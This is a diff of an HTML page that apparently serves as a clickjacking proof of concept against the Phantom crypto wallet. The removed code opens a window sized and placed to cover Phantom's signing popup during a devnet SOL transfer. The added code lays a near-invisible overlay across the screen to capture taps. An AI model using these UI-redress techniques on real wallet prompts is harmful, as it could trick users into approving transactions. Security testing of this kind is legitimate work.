@@ -1,212 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple SOL Transfer (Devnet)</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Phantom Mobile Clickjack Test</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      max-width: 600px;
-      margin: 0 auto;
-      padding: 20px;
+      font-family: sans-serif;
+      background: #f0f0f0;
+      margin: 0;
+      padding: 2rem;
       text-align: center;
     }
-    button {
-      background-color: #9945FF;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      cursor: pointer;
-      margin: 10px;
-      font-size: 16px;
-    }
-    button:disabled {
-      background-color: #cccccc;
-      cursor: not-allowed;
-    }
-    input {
-      padding: 10px;
-      width: 100%;
-      margin: 10px 0;
-      box-sizing: border-box;
-    }
-    .container {
-      margin-top: 30px;
-    }
-    #devnetWarning {
-      color: #FFA500;
+    #status {
+      margin: 2rem 0;
       font-weight: bold;
+      color: #333;
+    }
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.01); /* Nearly invisible */
+      z-index: 9999;
+      pointer-events: auto;
+    }
+    #notice {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #ffc107;
+      padding: 10px 20px;
+      border-radius: 8px;
+      z-index: 10000;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <h1>Simple SOL Transfer <span id="devnetWarning">(Devnet)</span></h1>
+  <h1>🧪 Phantom Clickjack Test</h1>
+  <p id="status">Waiting for Phantom connection...</p>
 
-  <div class="container">
-    <button id="connectButton">Connect to Phantom</button>
-    <p id="walletStatus">Wallet not connected</p>
-  </div>
+  <div id="notice">Try clicking around – this overlay may be stealing your taps.</div>
 
-  <div class="container" id="transferSection" style="display: none;">
-    <h2>Send SOL</h2>
-    <input type="text" id="recipientAddress" placeholder="Recipient Address">
-    <input type="number" id="solAmount" placeholder="Amount in SOL" step="0.01" min="0.01">
-    <button id="sendButton">Send SOL</button>
-    <p id="transactionStatus"></p>
-  </div>
+  <div id="overlay"></div>
 
   <script>
-    const isPhantomInstalled = window.solana && window.solana.isPhantom;
+    const status = document.getElementById('status');
+    const overlay = document.getElementById('overlay');
 
-    const connectButton = document.getElementById('connectButton');
-    const walletStatus = document.getElementById('walletStatus');
-    const transferSection = document.getElementById('transferSection');
-    const recipientAddress = document.getElementById('recipientAddress');
-    const solAmount = document.getElementById('solAmount');
-    const sendButton = document.getElementById('sendButton');
-    const transactionStatus = document.getElementById('transactionStatus');
+    // Overlay tap logger
+    overlay.addEventListener('click', () => {
+      alert('⚠️ Overlay captured the tap!');
+      console.log('Overlay intercepted tap');
+    });
 
-    let publicKey = null;
-    let connection = null;
-
-    if (!isPhantomInstalled) {
-      connectButton.disabled = true;
-      connectButton.textContent = 'Phantom Wallet Not Installed';
-      walletStatus.textContent = 'Please install Phantom Wallet extension';
+    // Try to connect in element mode
+    async function connectToPhantom() {
+      if (window.solana?.isPhantom) {
+        try {
+          const res = await window.solana.connect({
+            onlyIfTrusted: false,
+            app: "iframe"
+          });
+          status.innerText = "✅ Connected: " + res.publicKey.toString();
+        } catch (e) {
+          status.innerText = "❌ Connection failed: " + e.message;
+        }
+      } else {
+        status.innerText = "🚫 Phantom wallet not found";
+      }
     }
 
-    connectButton.addEventListener('click', async () => {
-      try {
-        const response = await window.solana.connect();
-        publicKey = response.publicKey.toString();
-        walletStatus.textContent = `Connected: ${publicKey.substring(0, 4)}...${publicKey.substring(publicKey.length - 4)}`;
-        transferSection.style.display = 'block';
-        connectButton.disabled = true;
-
-        connection = new solanaWeb3.Connection(
-          solanaWeb3.clusterApiUrl('devnet'),
-          'confirmed'
-        );
-
-        try {
-          transactionStatus.textContent = "Requesting Devnet SOL airdrop...";
-          const airdropSignature = await connection.requestAirdrop(
-            new solanaWeb3.PublicKey(publicKey),
-            solanaWeb3.LAMPORTS_PER_SOL
-          );
-          await connection.confirmTransaction(airdropSignature);
-          transactionStatus.textContent = "Received 1 Devnet SOL for testing!";
-        } catch (airdropError) {
-          transactionStatus.textContent = "Airdrop failed (you may need to get Devnet SOL manually)";
-          console.log("Airdrop error:", airdropError);
-        }
-      } catch (err) {
-        walletStatus.textContent = 'Connection failed: ' + err.message;
-      }
-    });
-
-    sendButton.addEventListener('click', async () => {
-      if (!publicKey) {
-        transactionStatus.textContent = 'Wallet not connected';
-        return;
-      }
-
-      const recipient = recipientAddress.value.trim();
-      const amount = parseFloat(solAmount.value);
-
-      if (!recipient || isNaN(amount) || amount <= 0) {
-        transactionStatus.textContent = 'Please enter valid recipient and amount';
-        return;
-      }
-
-      try {
-        transactionStatus.textContent = 'Preparing transaction...';
-        sendButton.disabled = true;
-
-        const recentBlockhash = await connection.getRecentBlockhash();
-
-        const transaction = new solanaWeb3.Transaction({
-          recentBlockhash: recentBlockhash.blockhash,
-          feePayer: new solanaWeb3.PublicKey(publicKey)
-        }).add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: new solanaWeb3.PublicKey(publicKey),
-            toPubkey: new solanaWeb3.PublicKey(recipient),
-            lamports: amount * solanaWeb3.LAMPORTS_PER_SOL
-          })
-        );
-
-        // Set up window blur detection to catch when Phantom popup opens
-        let distractionWindow = null;
-        const onBlur = () => {
-          if (!distractionWindow) {
-            // Longer delay to let Phantom fully load and become interactive
-            setTimeout(() => {
-              // Position window to cover typical Phantom popup location
-              const screenWidth = window.screen.width;
-              const screenHeight = window.screen.height;
-              const windowWidth = 420;
-              const windowHeight = 600;
-              
-              // Calculate position to cover Phantom (usually center-right area)
-              const left = Math.floor((screenWidth - windowWidth) / 2) + 50;
-              const top = Math.floor((screenHeight - windowHeight) / 2) - 50;
-              
-              distractionWindow = window.open(
-                'https://example.com', // Replace with your distraction or UI
-                '_blank',
-                `width=${windowWidth},height=${windowHeight},left=${left},top=${top},resizable=no,scrollbars=no,status=no,toolbar=no,menubar=no,location=no`
-              );
-              
-              // Don't aggressively focus - let Phantom work first
-              if (distractionWindow) {
-                // Only focus once, then let user interact with Phantom
-                setTimeout(() => {
-                  if (distractionWindow && !distractionWindow.closed) {
-                    distractionWindow.focus();
-                  }
-                }, 500);
-              }
-            }, 1000); // 1 second delay instead of 10ms
-          }
-        };
-        
-        window.addEventListener('blur', onBlur);
-
-        try {
-          const { signature } = await window.solana.signAndSendTransaction(transaction);
-          window.removeEventListener('blur', onBlur);
-          // Close the distraction window when transaction completes
-          if (distractionWindow && !distractionWindow.closed) {
-            distractionWindow.close();
-          }
-          transactionStatus.textContent = `Transaction sent! Signature: ${signature}`;
-          transactionStatus.innerHTML += `<br><a href="https://explorer.solana.com/tx/${signature}?cluster=devnet" target="_blank">View on Solana Explorer</a>`;
-        } catch (error) {
-          window.removeEventListener('blur', onBlur);
-          // Close the distraction window on error too
-          if (distractionWindow && !distractionWindow.closed) {
-            distractionWindow.close();
-          }
-          throw error;
-        }
-
-      } catch (err) {
-        transactionStatus.textContent = 'Transaction failed: ' + err.message;
-        console.error(err);
-      } finally {
-        sendButton.disabled = false;
-      }
-    });
-
-    const script = document.createElement('script');
-    script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
-    script.onload = () => {
-      console.log('Solana Web3.js loaded');
-    };
-    document.head.appendChild(script);
+    window.onload = connectToPhantom;
   </script>
 </body>
 </html>
